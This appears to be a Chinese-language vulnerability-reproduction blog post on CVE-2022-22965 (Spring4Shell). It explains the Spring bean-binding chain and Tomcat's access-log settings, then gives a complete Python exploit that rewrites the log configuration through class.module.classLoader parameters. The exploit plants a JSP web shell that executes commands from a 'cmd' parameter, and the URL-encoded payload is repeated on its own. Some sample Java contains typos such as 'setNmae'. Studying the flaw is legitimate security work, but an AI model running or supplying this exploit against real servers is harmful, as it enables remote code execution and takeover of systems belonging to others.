---
icon: edit
date: 2023-04-30
category:
  - 漏洞复现
tag:
  - 漏洞复现
  - CVE
star: true
sticky: true
---

# CVE-2022-22965-Spring-RCE

> https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement

> 受影响范围：
>
> - `Spring Framework < 5.3.18`
> - `Spring Framework < 5.2.20`
> - `JDK ≥ 9`
> - `Tomcat 8.5.77`、 `Tomcat 9.0.60` 等（`JDK 9` 以上和 部分`Tomcat` 版本组合的情况下）



`java.bean.PropertyDescriptor`

通过反射机制调用 `get/set` 方法



Spring 中 BeanWrapperImpl 用 setPropertyValue 和 getPropertyValue 获取和修改对象的属性



BeanWrapperImlp 对 spring 容器中管理的对象自动调用 get/set 方法



BeanWrapperImpl  进一步封装了 PropertyDescriptor





思路： 

只要能获取到路径，就可以通过这个路径，使用 Spring 参数自动绑定，修改 Spring工程里面的任意对象的任意属性



修改，Tomcat 日志的保存路径、文件名、内容，写入 webshell





```java
public class User {
    private String name;
    private Department department;
    
    public String getName() {
        return name;
    }
    public void setNmae(String name){
        this.name = name;
    }
    public Department getDepartment(){
        return department;
    }
    public void setDepartment(Department department){
        this.department = department;
    }
}
```

```java
public class Department{
    private String name;
    public String getName(){
        return name;
    }
    public void setNmae(String name){
        this.name = name;
    }
}
```

```java
@Controller
public class UserController{
    @RequestMapping("/addUser")
    public String addUser(@ResponseBody User user){
        return "OK";
    }
}
```



Tomcat 的日志文件： `tomcat` 根目录 / log 目录下

- catalina.xxxxx   启动日志
- host-manager.xxxx   
- xxxx.access.xxxxx   http 接口访问日志，就是访问接口时的日志
- manager.xxxxx   tomcat 管理界面日志







实现



通过 /addUser 接口的参数 User 对象的自动绑定，改变 Tomcat 的日志路径和内容



tomcat 的日志配置在 conf /server.xml 中

- directory: access_log 文件的输出目录
- prefix： access_log 文件名前缀
- suffix： access_log 文件名后缀
- pattern： access_log 文件内容格式
- fileDateFormat： access_log 文件名日期后缀，默认 yyyy-MM-dd



```xml
<Server>
	<Service>
    	<Engine>
    		<Host>
                <Value className="org.apache.catalina.values.AccessLogValue" 
                       directory="logs" 
                       prefix="localhost_access_log" 
                       suffix=".txt" 
                       pattern="%h %l %u %t &quot; %r&quot; %s %b" />
        	</Host>
    	</Engine>
    </Service>
</Server>
```



修改 SpringBoot 的启动类（默认在内置的 tomcat 中启动，要在指定 tomcat 中启动需要继承 SpringBootServletInitializer



```java
@SpringBootApplication
public class ApplicationMain extends SpringBootServletInitializer {
    
    public static void main(String[] args){
        SpringApplication.run(ApplicationMain.class, args);
    }
    
    @Override
    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder){
        return builder.sources(ApplicationMain.class);
    }
}
```

复现环境：

- JDK 11.0.11
- Tomcat 9.0.60
- SpringBoot 2.6.3
- 上面的代码打包 war 包放在 tomcat/webapps 下

利用：

`exploit.py --url http://localhost:8080/addUser`

```py
import requests
import argparse
from urllib.parse import urlparse
import time
 
# Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()
 
post_headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
 
get_headers = {
    "prefix": "<%",
    "suffix": "%>//",
    # This may seem strange, but this seems to be needed to bypass some check that looks for "Runtime" in the log_pattern
    "c": "Runtime",
}
 
 
def run_exploit(url, directory, filename):
    log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
                  f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
                  f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
                  f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
 
    log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    log_file_dir = f"class.module.classLoader.resources.context.parent.pipeline.first.directory={directory}"
    log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}"
    log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
 
    exp_data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])
 
    # Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times
    # If re-running the exploit, this will create an artifact of {old_file_name}_.jsp
    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
    print("[*] Resetting Log Variables.")
    ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False)
    print("[*] Response code: %d" % ret.status_code)
 
    # Change the tomcat log location variables
    print("[*] Modifying Log Configurations")
    ret = requests.post(url, headers=post_headers, data=exp_data, verify=False)
    print("[*] Response code: %d" % ret.status_code)
 
    # Changes take some time to populate on tomcat
    time.sleep(3)
 
    # Send the packet that writes the web shell
    ret = requests.get(url, headers=get_headers, verify=False)
    print("[*] Response Code: %d" % ret.status_code)
 
    time.sleep(1)
 
    # Reset the pattern to prevent future writes into the file
    pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
    print("[*] Resetting Log Variables.")
    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=False)
    print("[*] Response code: %d" % ret.status_code)
 
 
def main():
    parser = argparse.ArgumentParser(description='Spring Core RCE')
    parser.add_argument('--url', help='target url', required=True)
    parser.add_argument('--file', help='File to write to [no extension]', required=False, default="wuya")
    parser.add_argument('--dir', help='Directory to write to. Suggest using "webapps/[appname]" of target app',
                        required=False, default="webapps/ROOT")
 
    file_arg = parser.parse_args().file
    dir_arg = parser.parse_args().dir
    url_arg = parser.parse_args().url
 
    filename = file_arg.replace(".jsp", "")
 
    if url_arg is None:
        print("Must pass an option for --url")
        return
 
    try:
        run_exploit(url_arg, dir_arg, filename)
        print("[+] Exploit completed")
        print("[+] Check your target for a shell")
        print("[+] File: " + filename + ".jsp")
 
        if dir_arg:
            location = urlparse(url_arg).scheme + "://" + urlparse(url_arg).netloc + "/" + filename + ".jsp"
        else:
            location = f"Unknown. Custom directory used. (try app/{filename}.jsp?cmd=whoami"
        print(f"[+] Shell should be at: {location}?cmd=whoami")
    except Exception as e:
        print(e)
 
 
if __name__ == '__main__':
    main()
```





```
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
                  f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
                  f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
                  f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di
```



`class.module.classLoader.resources.context.parent.pipeline.first.pattern`

`getClass`

​	`getModule`

​		`getClassLoader`

​			...

​				`getFirst`

​					`setPattern`



调用链

User.getClass()

java.lang.Class.getModule()

java.lang.Module.getClassLoader()

org.apache.catalina.loader.ParallelWebappClassLoader.getResources()

org.apache.catalina.webresources.StandardRoot.getContext()

org.apache.catalina.core.StandardContext.getParent()

org.apache.catalina.core.StandardHost.getPipeline()

org.apache.catalina.core.StandardPipeline.getFirst()

org.apache.catalina.values.AccessLogValue.setPattern()





漏洞的关键就在于，BeanWrapperImpl 中缓存了 class 属性！！